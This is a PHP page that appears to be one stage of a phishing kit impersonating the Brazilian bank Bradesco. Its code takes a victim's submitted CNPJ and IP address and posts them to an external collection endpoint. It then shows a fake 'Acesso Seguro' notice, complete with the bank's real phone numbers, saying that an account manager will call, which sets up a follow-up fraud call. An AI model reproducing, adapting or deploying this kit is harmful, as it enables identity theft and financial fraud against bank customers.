<?php
    $cnpj = isset($_POST['campo_quarto']) ? trim($_POST['campo_quarto']) : '';

    if(empty($cnpj)){
        die("Erro: 403.");
    }
    
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $linkdatabase);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        "etapa3" => "ok",
        "ip" => $ip,
        "cnpj" => $cnpj
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Bradesco</title>
<link rel="stylesheet" href="css/desktop.css">
</head>
<body>

<div class="topbar">
	<div class="topbarleft">
        
		<div class="topbarlogo">
		
		</div>
         <div class="bgtopwhite">
            <h1 class="titulo_bg_top">Acesso Seguro</h1>
        </div>   
        <span class="data_bg_top"> <?php echo get_data_extenso(); ?></span>   
        <button type="button" class="btn_cancelar"></button>
	</div>
</div>

<div class="container">



    <div class="main">
       
        
       
      
        <div class="atualizacao_dados" style="height:300px;">
            <div class="content">
                
                <div class="topoinfo">
                <div class="logo-icon">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <line x1="18" y1="6" x2="6" y2="18" stroke="white" stroke-width="2" stroke-linecap="round"/>
                <line x1="6" y1="6" x2="18" y2="18" stroke="white" stroke-width="2" stroke-linecap="round"/>
                </svg>
                </div>
                  <h2>Renovação de usuário</h2>
                </div>

              
      
             

                       <p>Não foi possível concluir a ativação do usuário expirado no momento.</p>

                <p>Para garantir a continuidade do atendimento e a segurança das informações, 
                    o gerente responsável pela conta será acionado e entrará em contato 
                    com você o mais breve possível para dar sequência ao processo.</p>

                        <p>Agradecemos pela compreensão.</p>

            </div>


        </div>

            
     
    </div>

    <div class="right-panel">
        <img src="img/bg_aviso.png">
    </div>

</div>

<div class="footer">
    <div class="footer_left">
        <div class="footer_column"><img src="img/icone_rodape.gif"></div>
        <div class="footer_column">Bradesco Apoio à Empresa<br> 3003-1000 </div>
        <div class="footer_column">Alô Bradesco<br>0800 202 1000</div>
        <div class="footer_column">Deficiente Auditivo ou de Fala<br>0800 722 0099</div>
        <div class="footer_column">Ouvidoria<br>0800 727 9933</div>
    </div>
</div>

</body>
</html>